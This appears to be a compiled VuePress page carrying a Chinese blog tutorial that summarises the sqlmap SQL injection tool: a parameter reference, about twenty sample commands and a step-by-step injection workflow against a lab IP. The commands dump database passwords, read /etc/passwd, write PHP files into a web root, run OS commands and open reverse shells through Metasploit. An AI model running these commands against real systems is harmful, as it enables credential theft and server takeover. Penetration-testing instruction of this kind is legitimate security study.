import{i as e,r as t,s as n,t as r}from"./app-BJaruqUz.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-017-SQLMap%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93.html","title":"SQLMap用法总结","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"SQLMap用法总结","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"SQLMap用法总结","lock":"need"},"git":{"updatedTime":1777440700000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"fd547ca49fe6afef55548f7a0aeaeb4eca279a4d","time":1777440700000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-017-SQLMap用法总结.md"}`),a={name:`2022-04-17-017-SQLMap用法总结.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="sqlmap用法总结" tabindex="-1"><a class="header-anchor" href="#sqlmap用法总结"><span>SQLMap用法总结</span></a></h1><h2 id="参数说明" tabindex="-1"><a class="header-anchor" href="#参数说明"><span>参数说明</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">-u #注入点</span>
<span class="line">-f #指纹判别数据库类型</span>
<span class="line">-b #获取数据库版本信息</span>
<span class="line">-p #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;)</span>
<span class="line">-D &quot;&quot; #指定数据库名</span>
<span class="line">-T &quot;&quot; #指定表名</span>
<span class="line">-C &quot;&quot; #指定字段</span>
<span class="line">-s &quot;&quot; #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot; 恢复:-s &quot;xx.log&quot; –resume)</span>
<span class="line">–columns #列出字段</span>
<span class="line">–current-user #获取当前用户名称</span>
<span class="line">–current-db #获取当前数据库名称</span>
<span class="line">–users #列数据库所有用户</span>
<span class="line">–passwords #数据库用户所有密码</span>
<span class="line">–privileges #查看用户权限(–privileges -U root)</span>
<span class="line">-U #指定数据库用户</span>
<span class="line">–dbs #列出所有数据库</span>
<span class="line">–tables -D &quot;&quot; #列出指定数据库中的表</span>
<span class="line">–columns -T &quot;user&quot; -D &quot;mysql&quot; #列出mysql数据库中的user表的所有字段</span>
<span class="line">–dump-all #列出所有数据库所有表</span>
<span class="line">–exclude-sysdbs #只列出用户自己新建的数据库和表</span>
<span class="line">–dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot; #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</span>
<span class="line">–dump -T &quot;&quot; -D &quot;&quot; –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据</span>
<span class="line">–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</span>
<span class="line">–os #指定系统(Linux,Windows)</span>
<span class="line">-v #详细的等级(0-6)</span>
<span class="line">0：只显示Python的回溯，错误和关键消息。</span>
<span class="line">1：显示信息和警告消息。</span>
<span class="line">2：显示调试消息。</span>
<span class="line">3：有效载荷注入。</span>
<span class="line">4：显示HTTP请求。</span>
<span class="line">5：显示HTTP响应头。</span>
<span class="line">6：显示HTTP响应页面的内容</span>
<span class="line">–privileges #查看权限</span>
<span class="line">–is-dba #是否是数据库管理员</span>
<span class="line">–roles #枚举数据库用户角色</span>
<span class="line">–udf-inject #导入用户自定义函数（获取系统权限）</span>
<span class="line">–union-check #是否支持union 注入</span>
<span class="line">–union-cols #union 查询表记录</span>
<span class="line">–union-test #union 语句测试</span>
<span class="line">–union-use #采用union 注入</span>
<span class="line">–union-tech orderby #union配合order by</span>
<span class="line">–method &quot;POST&quot; –data &quot;&quot; #POST方式提交数据(–method &quot;POST&quot; –data &quot;page=1&amp;id=2″)</span>
<span class="line">–cookie &quot;用;号分开&quot; #cookie注入(–cookies=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;)</span>
<span class="line">–referer &quot;&quot; #使用referer欺骗(–referer &quot;http://www.baidu.com&quot;)</span>
<span class="line">–user-agent &quot;&quot; #自定义user-agent</span>
<span class="line">–proxy &quot;http://127.0.0.1:8118″ #代理注入</span>
<span class="line">–string &quot;&quot; #指定关键词</span>
<span class="line">–threads #采用多线程(–threads 3)</span>
<span class="line">–sql-shell #执行指定sql命令</span>
<span class="line">–sql-query #执行指定的sql语句(–sql-query &quot;SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )</span>
<span class="line">–file-read #读取指定文件</span>
<span class="line">–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)</span>
<span class="line">–file-dest #要写入的文件绝对路径</span>
<span class="line">–os-cmd=id #执行系统命令</span>
<span class="line">–os-shell #系统交互shell</span>
<span class="line">–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)</span>
<span class="line">–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)</span>
<span class="line">–os-smbrelay #</span>
<span class="line">–os-bof #</span>
<span class="line">–reg-read #读取win系统注册表</span>
<span class="line">–priv-esc #</span>
<span class="line">–time-sec= #延迟设置 默认–time-sec=5 为5秒</span>
<span class="line">-p &quot;user-agent&quot; –user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot; #指定user-agent注入</span>
<span class="line">–eta #盲注</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>/pentest/database/sqlmap/txt/ common-columns.txt 字段字典 common-outputs.txt common-tables.txt 表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt</p><h2 id="常用语句" tabindex="-1"><a class="header-anchor" href="#常用语句"><span>常用语句</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">1.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -f -b –current-user –current-db –users –passwords –dbs -v 0</span>
<span class="line">2.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –passwords -U root –union-use -v 2</span>
<span class="line">3.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2</span>
<span class="line">4.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –dump -C &quot;user,pass&quot; -v 1 –exclude-sysdbs</span>
<span class="line">5.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –sql-shell -v 2</span>
<span class="line">6.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –file-read &quot;c:\\boot.ini&quot; -v 2</span>
<span class="line">7.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2</span>
<span class="line">8.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-cmd &quot;id&quot; -v 1</span>
<span class="line">9.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-shell –union-use -v 2</span>
<span class="line">10.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1</span>
<span class="line">11.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 -v 1</span>
<span class="line">12.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –os-bof –msf-path=/opt/framework/msf3 -v 1</span>
<span class="line">13.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 –reg-add –reg-key=&quot;HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap&quot; –reg-value=Test –reg-type=REG_SZ –reg-data=1</span>
<span class="line">14.</span>
<span class="line">./sqlmap.py -u http://192.168.109.139/test.php?p=2 -b –eta</span>
<span class="line">15.</span>
<span class="line">./sqlmap.py -u &quot;http://192.168.109.139/sqlmap/mysql/get_str_brackets.php?id=1″ -p id –prefix &quot;‘)&quot; –suffix &quot;AND (‘abc’=’abc&quot;</span>
<span class="line">16.</span>
<span class="line">./sqlmap.py -u &quot;http://192.168.109.139/sqlmap/mysql/basic/get_int.php?id=1″ –auth-type Basic –auth-cred &quot;testuser:testpass&quot;</span>
<span class="line">17.</span>
<span class="line">./sqlmap.py -l burp.log –scope=&quot;(www)?\\.target\\.(com|net|org)&quot;</span>
<span class="line">18.</span>
<span class="line">./sqlmap.py -u &quot;http://192.168.109.139/sqlmap/mysql/get_int.php?id=1″ –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span>
<span class="line">19.</span>
<span class="line">./sqlmap.py -u &quot;http://192.168.109.139/sqlmap/mssql/get_int.php?id=1″ –sql-query &quot;SELECT ‘foo&#39;&quot; -v 1</span>
<span class="line">20.</span>
<span class="line">./sqlmap.py -u &quot;http://192.168.109.139/mysql/get_int_4.php?id=1″ –common-tables -D testdb –banner</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="简单的注入流程" tabindex="-1"><a class="header-anchor" href="#简单的注入流程"><span>简单的注入流程</span></a></h2><p><strong>1.读取数据库版本，当前用户，当前数据库</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 -f -b –current-user –current-db -v 1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>2.判断当前数据库用户权限</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –privileges -U 用户名 -v 1</span>
<span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –is-dba -U 用户名 -v 1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3.读取所有数据库用户或指定数据库用户的密码</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –users –passwords -v 2</span>
<span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –passwords -U root -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>4.获取所有数据库</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –dbs -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>5.获取指定数据库中的所有表</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –tables -D mysql -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>6.获取指定数据库名中指定表的字段</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –columns -D mysql -T users -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>7.获取指定数据库名中指定表中指定字段的数据</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>8.file-read读取web文件</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –file-read &quot;/etc/passwd&quot; -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>9.file-write写入文件到web</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">sqlmap -u http://192.168.109.139/test.php?p=2 –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,28)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};